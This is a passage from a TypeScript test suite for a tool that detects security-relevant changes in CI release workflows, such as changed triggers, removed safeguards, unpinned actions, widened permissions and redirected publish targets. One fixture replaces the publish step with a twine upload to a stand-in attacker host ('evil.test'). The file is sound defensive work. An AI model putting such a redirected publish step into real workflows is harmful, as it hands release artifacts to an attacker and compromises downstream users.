    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "workflow_run",
      before: "types=[completed];workflows=[Trusted build]",
      after: "types=[completed];workflows=[Untrusted build]",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags a changed release schedule", async () => {
    const prior = BASE_WORKFLOW.replace(
      '  push:\n    tags:\n      - "v*"\n',
      "  schedule:\n    - cron: '0 0 * * 1'\n",
    );
    const current = prior.replace("0 0 * * 1", "0 0 * * 2");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "schedule",
      before: "cron=[0 0 * * 1]",
      after: "cron=[0 0 * * 2]",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags a changed release schedule timezone", async () => {
    const prior = BASE_WORKFLOW.replace(
      '  push:\n    tags:\n      - "v*"\n',
      "  schedule:\n    - cron: '0 9 * * 1'\n      timezone: Europe/Brussels\n",
    );
    const current = prior.replace("Europe/Brussels", "America/New_York");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "schedule",
      before: "cron=[0 9 * * 1 (Europe/Brussels)]",
      after: "cron=[0 9 * * 1 (America/New_York)]",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags changed workflow_dispatch input authority", async () => {
    const prior = BASE_WORKFLOW.replace(
      '  push:\n    tags:\n      - "v*"\n',
      "  workflow_dispatch:\n    inputs:\n      registry:\n        type: choice\n        options: [npm, internal]\n        default: npm\n",
    );
    const current = prior.replace("default: npm", "default: internal");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "workflow_dispatch",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags removing the environment boundary", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("    environment: pypi\n", ""),
    );
    expect(find(delta.changes, "environment_removed")).toMatchObject({
      significance: "high",
      before: "pypi",
      after: null,
    });
  });

  it("flags a changed environment name", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("    environment: pypi\n", "    environment: pypi-fast\n"),
    );
    expect(find(delta.changes, "environment_changed")).toMatchObject({
      significance: "high",
      before: "pypi",
      after: "pypi-fast",
    });
  });

  it("flags a removed attestation safeguard", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("      - uses: actions/attest-build-provenance@v2\n", ""),
    );
    expect(find(delta.changes, "safeguard_removed")).toMatchObject({
      significance: "high",
      subject: "attestation",
      before: "actions/attest-build-provenance@v2",
    });
  });

  it("flags a swapped publish path", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - run: twine upload --repository-url https://evil.test/ dist/*\n",
      ),
    );
    expect(find(delta.changes, "publish_step_added")).toMatchObject({
      significance: "high",
      subject: "publish command",
    });
    expect(find(delta.changes, "publish_step_removed")).toMatchObject({
      significance: "medium",
      subject: "publish action",
    });
  });

  it.each([
    {
      label: "python module twine",
      prior: "python -m twine upload --repository-url https://upload.pypi.org/legacy/ dist/*",
      current: "python -m twine upload --repository-url https://packages.example.test/ dist/*",
    },
    {
      label: "npm workspace",
      prior: "npm --workspace packages/public publish",
      current: "npm --workspace packages/internal publish",
    },
    {
      label: "pnpm filter",
      prior: "pnpm --filter @acme/public publish",
      current: "pnpm --filter @acme/internal publish",
    },
    {
      label: "npx VS Code publisher",
      prior: "npx vsce publish --pre-release",
      current: "npx vsce publish --target linux-x64",
    },
  ])("captures changed $label publish commands", async ({ prior, current }) => {
    const priorWorkflow = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1",
      `      - run: ${prior}`,
    );
    const currentWorkflow = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1",
      `      - run: ${current}`,
    );

    const delta = await deltaBetween(priorWorkflow, currentWorkflow);

    expect(delta.status).toBe("changed");
    expect(kinds(delta.changes)).toContain("publish_step_added");
    expect(kinds(delta.changes)).toContain("publish_step_removed");
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it("flags changed publish-action inputs instead of calling the edit cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: https://upload.pypi.org/legacy/\n",
    );
    const current = prior.replace(
      "https://upload.pypi.org/legacy/",
      "https://packages.example.test/",
    );
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
      significance: "high",
      subject: "pypa/gh-action-pypi-publish",
    });
    expect(delta.status).toBe("changed");
  });

  it("flags changed inputs on an ordinary action instead of calling the edit cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      "      - uses: actions/setup-node@v4\n        with:\n          registry-url: https://registry.npmjs.org\n      - uses: pypa/gh-action-pypi-publish@release/v1\n",
    );
    const current = prior.replace("https://registry.npmjs.org", "https://packages.example.test");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
      significance: "high",
      subject: "actions/setup-node",
    });
    expect(delta.status).toBe("changed");
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it("flags changed safeguard inputs instead of calling the edit cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: actions/attest-build-provenance@v2\n",
      "      - uses: actions/attest-build-provenance@v2\n        with:\n          subject-path: dist/**\n",
    );
    const current = prior.replace("subject-path: dist/**", "subject-path: unrelated/**");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
      significance: "high",
      subject: "actions/attest-build-provenance",
    });
    expect(delta.status).toBe("changed");
  });

  it("flags an action reference that stopped being pinned", async () => {
    const unpinned = BASE_WORKFLOW.replace(
      "actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "actions/checkout@main",
    );
    const delta = await deltaBetween(BASE_WORKFLOW, unpinned);
    expect(find(delta.changes, "action_unpinned")).toMatchObject({
      significance: "high",
      subject: "actions/checkout",
      after: "main",
    });
  });

  it("reports an always-mutable reference as standing, not as a change", async () => {
    const delta = await deltaBetween(BASE_WORKFLOW, BASE_WORKFLOW);
    expect(delta.status).toBe("unchanged");
    expect(delta.changes).toEqual([]);
    // `actions/upload-artifact@v4` and friends were mutable in both releases.
    expect(delta.standing.mutableRefs).toContain("actions/upload-artifact@v4");
    expect(delta.standing.mutableRefs).not.toContain(
      "actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    );
  });

  it("flags a moved tag on a mutable reference as a ref change", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("actions/upload-artifact@v4", "actions/upload-artifact@v3"),
    );
    expect(find(delta.changes, "action_ref_changed")).toMatchObject({
      significance: "medium",
      subject: "actions/upload-artifact",
      before: "v4",
      after: "v3",
    });
  });

  it("reports a changed duplicate action beside another categorized change", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n" +
        "        with:\n" +
        "          repository-url: https://upload.pypi.org/legacy/\n" +
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n" +
        "        with:\n" +
        "          repository-url: https://test.pypi.org/legacy/\n",
    );
    const current = prior
      .replace('      - "v*"', '      - "release-*"')
      .replace("https://test.pypi.org/legacy/", "https://packages.example.test/");

    const delta = await deltaBetween(prior, current);
    expect(find(delta.changes, "trigger_filter_changed")).toBeDefined();
    expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
      significance: "high",
      subject: "pypa/gh-action-pypi-publish",
    });
    expect(kinds(delta.changes)).not.toContain("workflow_authority_changed");
  });

  it("reports action reordering beside another categorized change", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      "      - uses: actions/setup-python@v5\n" +
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
    );
    const current = prior
      .replace('      - "v*"', '      - "release-*"')
      .replace(
        "      - uses: actions/setup-python@v5\n" +
          "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n" +
          "      - uses: actions/setup-python@v5\n",
      );

    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toBeDefined();
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      subject: expect.stringContaining("action ordering"),
    });
  });

  it("reports reordered duplicate action configurations beside another categorized change", async () => {
    const orderedActions =
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n" +
      "        with:\n" +
      "          repository-url: https://upload.pypi.org/legacy/\n" +
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n" +
      "        with:\n" +
      "          repository-url: https://test.pypi.org/legacy/\n";
    const reorderedActions =
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n" +
      "        with:\n" +
      "          repository-url: https://test.pypi.org/legacy/\n" +
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n" +
      "        with:\n" +
      "          repository-url: https://upload.pypi.org/legacy/\n";
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      orderedActions,
    );
    const current = prior
      .replace('      - "v*"', '      - "release-*"')
      .replace(orderedActions, reorderedActions);

    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toBeDefined();
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      subject: "action ordering",
    });
    expect(kinds(delta.changes)).not.toContain("action_configuration_changed");
  });

  it("reports reordered refs of the same action beside another categorized change", async () => {
    const orderedActions =
      "      - uses: actions/setup-python@v4\n" + "      - uses: actions/setup-python@v5\n";
    const reorderedActions =
      "      - uses: actions/setup-python@v5\n" + "      - uses: actions/setup-python@v4\n";
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      orderedActions + "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
    );
    const current = prior
      .replace('      - "v*"', '      - "release-*"')
      .replace(orderedActions, reorderedActions);

    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toBeDefined();
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      subject: "action ordering",
    });
  });

  it("flags a changed artifact producer/consumer path", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace(
        "          name: pypi-release-candidate\n          path: dist/\n  publish:",
        "          name: pypi-release-candidate\n          path: out/\n  publish:",
      ),
    );
    expect(find(delta.changes, "artifact_flow_changed")).toMatchObject({
      significance: "medium",
      before: "dist/",
      after: "out/",
    });
  });

  // A baseline is looked up *by* release path, so a delta against one can never
  // see the path move. The reachable case is the opposite: no baseline for this
  // path, but the target has approved history on others.
  describe("release path", () => {
    it("flags a release path with no approved history on a target that has some", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const delta = computeReleaseAuthorityDelta(current, null, {
        approvedReleasePaths: [".github/workflows/release.yml"],
      });
      expect(delta.status).toBe("changed");
      expect(delta.requiresApproval).toBe(true);
      expect(delta.baseline).toBeNull();
      expect(find(delta.changes, "release_path_changed")).toMatchObject({
        significance: "high",
        before: ".github/workflows/release.yml",
        after: ".github/workflows/publish.yml",
      });
    });

    it("names every approved path, summarizing past the display cap", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const paths = Array.from({ length: 10 }, (_, i) => `.github/workflows/r${i}.yml`);
      const delta = computeReleaseAuthorityDelta(current, null, { approvedReleasePaths: paths });
      const change = find(delta.changes, "release_path_changed");
      expect(change?.before).toContain(".github/workflows/r0.yml");
      expect(change?.before).toContain("+2 more");
    });

    it("stays neutral when the target has no approved history at all", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const delta = computeReleaseAuthorityDelta(current, null, { approvedReleasePaths: [] });
      expect(delta.status).toBe("no_baseline");
      expect(delta.requiresApproval).toBe(false);
    });

    it("ignores the release's own path in the approved set", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const delta = computeReleaseAuthorityDelta(current, null, {
        approvedReleasePaths: [".github/workflows/publish.yml"],
      });
      expect(delta.status).toBe("no_baseline");
    });

    it("does not overclaim when the entry path could not be read", async () => {
      const current = await makeSnapshot({ workflowPath: null });
      const delta = computeReleaseAuthorityDelta(current, null, {
        approvedReleasePaths: [".github/workflows/release.yml"],
      });
      expect(delta.status).toBe("no_baseline");
      expect(delta.requiresApproval).toBe(false);
    });
  });

  describe("reusable workflows", () => {
    const CALLER = `
on:
  push:
    tags:
      - "v*"
permissions:
  contents: read
jobs:
  publish:
    uses: acme/shared/.github/workflows/publish.yml@dddddddddddddddddddddddddddddddddddddddd
    secrets: inherit
`;
    const REUSED = `
on:
  workflow_call:
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write
    steps:
      - uses: pypa/gh-action-pypi-publish@release/v1
`;
    const REUSED_PATH = "acme/shared/.github/workflows/publish.yml";

    const graph = (caller: string, reused: string) => [
      { path: ENTRY, content: caller, role: "entry" as const },
      { path: REUSED_PATH, content: reused, role: "referenced" as const },
    ];

    it("detects a change inside the reusable workflow, not just the caller", async () => {
      const prior = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const current = await makeSnapshot({
        workflows: graph(
          CALLER,
          REUSED.replace(
            "      id-token: write\n",
            "      id-token: write\n      contents: write\n",
          ),
        ),
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "permission_added")).toMatchObject({
        significance: "high",
        scope: `${REUSED_PATH}/publish`,
        subject: "contents",
      });
    });

    it("detects a repointed reusable-workflow reference", async () => {
      const prior = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const current = await makeSnapshot({
        workflows: graph(CALLER.replace("@" + "d".repeat(40), "@main"), REUSED),
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "action_unpinned")).toMatchObject({
        significance: "high",
        subject: "acme/shared/.github/workflows/publish.yml",
      });
    });

    it("flags newly inherited secrets on a reusable call", async () => {
      const prior = await makeSnapshot({
        workflows: graph(CALLER.replace("    secrets: inherit\n", ""), REUSED),
      });
      const current = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "secrets_inherit_added")).toMatchObject({ significance: "high" });
    });

    it("flags changed explicit inputs and secrets on a reusable call", async () => {
      const explicit = CALLER.replace(
        "    secrets: inherit\n",
        "    with:\n      target: production\n    secrets:\n      token: ${{ secrets.PYPI_TOKEN }}\n",
      );
      const prior = await makeSnapshot({ workflows: graph(explicit, REUSED) });
      const changedInput = await makeSnapshot({
        workflows: graph(explicit.replace("target: production", "target: staging"), REUSED),
      });
      const changedSecret = await makeSnapshot({
        workflows: graph(
          explicit.replace("secrets.PYPI_TOKEN", "secrets.PYPI_ADMIN_TOKEN"),
          REUSED,
        ),
      });

      for (const current of [changedInput, changedSecret]) {
        const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
        expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
          significance: "high",
          subject: "acme/shared/.github/workflows/publish.yml",
        });
      }
    });

    it("flags a reusable workflow dropping out of the graph", async () => {
      const prior = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const current = await makeSnapshot({ workflows: [{ path: ENTRY, content: CALLER }] });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "workflow_removed")).toMatchObject({
        significance: "medium",
        subject: "reusable workflow",
      });
    });

    it("keeps repeated reusable-workflow paths distinct", async () => {
      const repeatedGraph = [
        { path: ENTRY, content: CALLER, role: "entry" as const },
        {
          path: REUSED_PATH,
          content: REUSED,
          role: "referenced" as const,
          sha: "a".repeat(40),
        },
        {
          path: REUSED_PATH,
          content: REUSED.replace("    environment: pypi", "    environment: npm"),
          role: "referenced" as const,
          sha: "b".repeat(40),
        },
      ];
      const snapshot = await makeSnapshot({ workflows: repeatedGraph });
      const delta = computeReleaseAuthorityDelta(snapshot, {
        snapshot,
        ref: BASELINE_REF,
      });

      expect(delta.status).toBe("unchanged");
      expect(delta.changes).toEqual([]);
      expect(delta.requiresApproval).toBe(false);

      const changed = await makeSnapshot({
        workflows: [
          repeatedGraph[0],
          repeatedGraph[1],
          {
            ...repeatedGraph[2],
            content: repeatedGraph[2].content.replace("ubuntu-latest", "windows-latest"),
          },
        ],
      });
      const changedDelta = computeReleaseAuthorityDelta(changed, {
        snapshot,
        ref: BASELINE_REF,
      });

      expect(
        changedDelta.changes.filter((change) => change.kind === "workflow_authority_changed"),
      ).toHaveLength(1);
      expect(changedDelta.status).toBe("changed");
    });

    it("keeps permission changes distinct across repeated workflow paths", async () => {
      const permissionWorkflow = (level: "none" | "write") => `
on: workflow_call
permissions:
  contents: ${level}
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: npm publish
`;
      const prior = await makeSnapshot({
        workflows: [
          {
            path: REUSED_PATH,
            content: permissionWorkflow("write"),
            role: "referenced",
            sha: "a".repeat(40),
          },
          {
            path: REUSED_PATH,
            content: permissionWorkflow("none"),
            role: "referenced",
            sha: "b".repeat(40),
          },
        ],
      });
      const current = await makeSnapshot({
        workflows: [
          {
            path: REUSED_PATH,
            content: permissionWorkflow("none"),
            role: "referenced",
            sha: "a".repeat(40),
          },
          {
            path: REUSED_PATH,
            content: permissionWorkflow("write"),
            role: "referenced",
            sha: "b".repeat(40),
          },
        ],
      });

      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });

      expect(delta.changes).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ kind: "permission_narrowed", significance: "low" }),
          expect.objectContaining({ kind: "permission_widened", significance: "high" }),
        ]),
      );
      expect(delta.highestSignificance).toBe("high");
    });
  });

  describe("local actions", () => {
    const workflow = `
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: $/actions/publish
`;

    it("flags a changed local-action directory with unchanged workflow YAML", async () => {
      const prior = await makeSnapshot({
        workflows: [
          { path: ENTRY, content: workflow, localActionDigests: { "$/actions/publish": "a" } },
        ],
      });
      const current = await makeSnapshot({
        workflows: [
          { path: ENTRY, content: workflow, localActionDigests: { "$/actions/publish": "b" } },
        ],
      });

      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });

      expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
        significance: "high",
        subject: "./actions/publish",
      });
      expect(delta.status).toBe("changed");
    });

    it("distinguishes workspace-relative actions from commit-bound actions", async () => {
      const priorWorkflow = workflow.replace("$/actions/publish", "./.github/actions/publish");
      const prior = await makeSnapshot({
        workflows: [{ path: ENTRY, content: priorWorkflow }],
      });
      const currentWorkflow = priorWorkflow.replace("./.github", "$/.github");
      const current = await makeSnapshot({
        workflows: [
          {
            path: ENTRY,
            content: currentWorkflow,
            localActionDigests: { "$/.github/actions/publish": "a" },
          },
        ],
      });

      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });

      expect(current.actions).toEqual([
        expect.objectContaining({ uses: "$/.github/actions/publish", ref: null, pinned: true }),
      ]);
      expect(prior.actions).toEqual([
        expect.objectContaining({ uses: "./.github/actions/publish", ref: null, pinned: false }),
      ]);
      expect(delta.standing.mutableRefs).toEqual([]);
      expect(find(delta.changes, "action_pinned")).toMatchObject({
        significance: "low",
        subject: "./.github/actions/publish",
      });
      expect(delta.status).toBe("changed");
      expect(delta.requiresApproval).toBe(true);
    });

    it("flags changed local-action inputs with an unchanged directory", async () => {
      const priorWorkflow = workflow.replace(
        "      - uses: $/actions/publish\n",
        "      - uses: $/actions/publish\n        with:\n          registry: https://registry.npmjs.org\n",
      );
      const currentWorkflow = priorWorkflow.replace(
        "https://registry.npmjs.org",
        "https://packages.example.test",
      );
      const localActionDigests = { "$/actions/publish": "unchanged" };
      const prior = await makeSnapshot({
        workflows: [{ path: ENTRY, content: priorWorkflow, localActionDigests }],
      });
      const current = await makeSnapshot({
        workflows: [{ path: ENTRY, content: currentWorkflow, localActionDigests }],
      });

      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });

      expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
        significance: "high",
        subject: "./actions/publish",
      });
      expect(delta.status).toBe("changed");
    });
  });

  it("keeps every bounded authority change reviewable past the former display cap", async () => {
    const steps = (ref: string) =>
      Array.from({ length: 120 }, (_, index) => `      - uses: acme/action-${index}@${ref}`).join(
        "\n",
      );
    const prior = `on: push\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n${steps("a".repeat(40))}\n`;
    const current = `on: push\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n${steps("b".repeat(40))}\n`;

    const delta = await deltaBetween(prior, current);

    expect(delta.changeCount).toBe(120);
    expect(delta.changes).toHaveLength(120);
    expect(new Set(delta.changes.map((change) => change.subject)).size).toBe(120);
  });

  describe("artifact continuity", () => {
    it("compares the shape of the artifact set, not per-release digests", async () => {
      const prior = await makeSnapshot({
        artifacts: [
          { name: "widget-1.0.0-py3-none-any.whl", kind: "wheel", sha256: "old1" },
          { name: "widget-1.0.0.tar.gz", kind: "sdist", sha256: "old2" },
        ],
      });
      const current = await makeSnapshot({
        artifacts: [
          { name: "widget-1.1.0-py3-none-any.whl", kind: "wheel", sha256: "new1" },
          { name: "widget-1.1.0.tar.gz", kind: "sdist", sha256: "new2" },
        ],
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      // New version, new digests, same shape: this must not read as a change.
      expect(delta.status).toBe("unchanged");
    });

    it("flags a release that gained an artifact kind", async () => {
      const prior = await makeSnapshot({
        artifacts: [{ name: "widget-1.0.0.tar.gz", kind: "sdist", sha256: "a" }],
      });
      const current = await makeSnapshot({
        artifacts: [
          { name: "widget-1.1.0.tar.gz", kind: "sdist", sha256: "b" },
          { name: "widget-1.1.0-py3-none-any.whl", kind: "wheel", sha256: "c" },
        ],
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "artifact_set_changed")).toMatchObject({
        significance: "medium",
        before: "1×sdist",
        after: "1×sdist, 1×wheel",
      });
    });

    it("counts artifacts with no digest as a broken approval binding", async () => {
      const current = await makeSnapshot({
        artifacts: [{ name: "widget-1.1.0.tar.gz", kind: "sdist", sha256: "" }],
      });
      const delta = computeReleaseAuthorityDelta(current, null);
      expect(delta.standing.artifactsWithoutDigest).toBe(1);
    });
  });

  describe("coverage", () => {
    it("marks a snapshot with unreadable definitions incomplete", async () => {
      const current = await makeSnapshot({
        unresolved: [{ path: "other/repo/.github/workflows/x.yml", reason: "not_accessible" }],
      });
      expect(current.coverage.complete).toBe(false);
      const delta = computeReleaseAuthorityDelta(current, null);
      expect(delta.standing.coverageComplete).toBe(false);
      expect(delta.standing.unresolved).toHaveLength(1);
      expect(find(delta.changes, "coverage_incomplete")).toMatchObject({
        significance: "medium",
      });
      expect(delta.requiresApproval).toBe(true);
    });

    it("flags coverage that regressed against a complete baseline", async () => {
      const prior = await makeSnapshot();
      const current = await makeSnapshot({
        unresolved: [{ path: "other/repo/.github/workflows/x.yml", reason: "not_accessible" }],
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "coverage_regressed")).toMatchObject({ significance: "medium" });
      expect(delta.requiresApproval).toBe(true);
    });

    it("keeps incomplete coverage approval-requiring across baselines", async () => {
      const unresolved: AuthorityUnresolved[] = [
        { path: "other/repo/.github/workflows/x.yml", reason: "not_accessible" },
      ];
      const prior = await makeSnapshot({ unresolved });
      const current = await makeSnapshot({ unresolved });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(kinds(delta.changes)).not.toContain("coverage_regressed");
      expect(find(delta.changes, "coverage_incomplete")).toMatchObject({ significance: "medium" });
      expect(delta.status).toBe("changed");
      expect(delta.requiresApproval).toBe(true);
      expect(delta.standing.coverageComplete).toBe(false);
    });

    it("requires approval when a complete capture follows an incomplete baseline", async () => {
      const prior = await makeSnapshot({
        unresolved: [{ path: "other/repo/.github/workflows/x.yml", reason: "not_accessible" }],
      });
      const current = await makeSnapshot();

      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });

      expect(find(delta.changes, "coverage_baseline_incomplete")).toMatchObject({
        significance: "medium",
        before: "other/repo/.github/workflows/x.yml (not_accessible)",
        after: "complete",
      });
      expect(delta.status).toBe("changed");
      expect(delta.requiresApproval).toBe(true);
    });

    it("marks capped snapshot evidence as incomplete instead of silently omitting it", async () => {
      const current = await makeSnapshot({
        artifacts: Array.from({ length: 257 }, (_, index) => ({
          name: `artifact-${String(index).padStart(3, "0")}.tgz`,
          kind: "npm",
          sha256: String(index),
        })),
      });

      expect(current.artifacts).toHaveLength(256);
      expect(current.coverage).toMatchObject({
        complete: false,
        unresolved: [{ path: "+1 artifacts", reason: "limit_reached" }],
      });
    });
  });

  it("orders changes with the most significant first", async () => {
    const rewritten = BASE_WORKFLOW.replace("      contents: read\n", "      contents: write\n")
      .replace("actions/upload-artifact@v4", "actions/upload-artifact@v3")
      .replace("      - uses: actions/attest-build-provenance@v2\n", "");
    const delta = await deltaBetween(BASE_WORKFLOW, rewritten);
    expect(delta.highestSignificance).toBe("high");
    expect(delta.changes[0].significance).toBe("high");
    const significances = delta.changes.map((change) => change.significance);
    expect(significances).toEqual([...significances].sort(bySignificanceDesc));
  });
});

function bySignificanceDesc(a: string, b: string): number {
  const rank: Record<string, number> = { high: 0, medium: 1, low: 2 };
  return rank[a] - rank[b];
}
